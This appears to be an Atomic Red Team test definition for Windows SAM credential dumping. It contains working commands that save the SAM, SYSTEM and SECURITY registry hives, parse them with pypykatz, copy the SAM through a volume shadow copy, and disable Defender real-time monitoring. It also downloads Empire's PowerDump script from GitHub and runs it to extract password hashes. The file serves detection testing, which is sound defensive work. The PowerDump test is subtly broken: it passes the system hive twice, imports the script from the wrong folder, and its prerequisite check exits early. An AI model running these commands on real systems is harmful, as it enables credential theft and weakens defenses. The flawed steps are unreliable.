attack_technique: T1003.002
display_name: "OS Credential Dumping: Security Account Manager"
atomic_tests:
- name: Registry dump of SAM, creds, and secrets
  auto_generated_guid: 5c2571d0-1572-416d-9676-812e64ca9f44
  description: |
    Local SAM (SAM & System), cached credentials (System & Security) and LSA secrets (System & Security) can be enumerated
    via three registry keys. Then processed locally using https://github.com/Neohapsis/creddump7

    Upon successful execution of this test, you will find three files named, sam, system and security in the %temp% directory.
  supported_platforms:
  - windows
  executor:
    command: |
      reg save HKLM\sam %temp%\sam
      reg save HKLM\system %temp%\system
      reg save HKLM\security %temp%\security
    cleanup_command: |
      del %temp%\sam >nul 2> nul
      del %temp%\system >nul 2> nul
      del %temp%\security >nul 2> nul
    name: command_prompt
    elevation_required: true

- name: Registry parse with pypykatz
  auto_generated_guid: a96872b2-cbf3-46cf-8eb4-27e8c0e85263
  description: |
    Parses registry hives to obtain stored credentials
  supported_platforms:
  - windows
  dependency_executor_name: powershell
  dependencies:
  - description: |
      Computer must have python 3 installed
    prereq_command: |
      if (python --version) {exit 0} else {exit 1}
    get_prereq_command: |
      echo "Python 3 must be installed manually"
  - description: |
      Computer must have pip installed
    prereq_command: |
      if (pip3 -V) {exit 0} else {exit 1}
    get_prereq_command: |
      echo "PIP must be installed manually"
  - description: |
      pypykatz must be installed and part of PATH
    prereq_command: |
      if (cmd /c pypykatz -h) {exit 0} else {exit 1}
    get_prereq_command: |
      pip3 install pypykatz
  executor:
    command: |
      pypykatz live registry
    name: command_prompt
    elevation_required: true
- name: esentutl.exe SAM copy
  auto_generated_guid: a90c2f4d-6726-444e-99d2-a00cd7c20480
  description: |
    Copy the SAM hive using the esentutl.exe utility
    This can also be used to copy other files and hives like SYSTEM, NTUSER.dat etc.
  supported_platforms:
  - windows
  input_arguments:
    file_path:
      description: Path to the file to copy
      type: Path
      default: '%SystemRoot%/system32/config/SAM'
    file_name:
      description: Name of the copied file
      type: String
      default: SAM
    copy_dest:
      description: Destination of the copied file
      type: String
      default: '%windir%'
  executor:
    command: |
      del #{copy_dest}\#{file_name} & esentutl.exe /y /vss #{file_path} /d #{copy_dest}/#{file_name}
    name: command_prompt
    elevation_required: true
    
- name: PowerDump to parse SAM and SYSTEM files for hashes and usernames
  description: Use PowerDump to parse SAM and SYSTEM files for hashes and usernames
  supported_platforms:
  - windows
  dependency_executor_name: powershell
  dependencies:
  - description: Are the files in temp called SAM and SYSTEM
    prereq_command: |-
      if (Test-Path $Env:Temp\sam) {exit 0} else {exit 1}
      if (Test-Path $Env:Temp\system) {exit 0} else {exit 1}
    get_prereq_command: |-
      Write-Host "STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON" -fore green
      Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned
      Set-MpPreference -DisableRealtimeMonitoring $true
      Write-Host "STARTING TO SAVE SAM AND SYSTEM FROM REGISTRY" -fore green
      reg save HKLM\sam $Env:Temp\sam
      reg save HKLM\system $Env:Temp\system
  executor:
    command: |-
      Invoke-Webrequest -Uri "https://raw.githubusercontent.com/BC-SECURITY/Empire/master/data/module_source/credentials/Invoke-PowerDump.ps1" -UseBasicParsing -OutFile "$Env:Temp\PowerDump.ps1"
      Import-Module .\PowerDump.ps1
      Invoke-PowerDump $Env:Temp\system $Env:Temp\system
    cleanup_command: |-
      Write-Host "DELETING ALL FILES that were downloaded earlier" -fore green
      remove-item $env:TEMP\system
      remove-item $env:TEMP\sam
      Write-Host "TURN ON DEFENDER REALTIME MONITORING" -fore green
      Set-MpPreference -DisableRealtimeMonitoring $false
    name: powershell
    elevation_required: true
  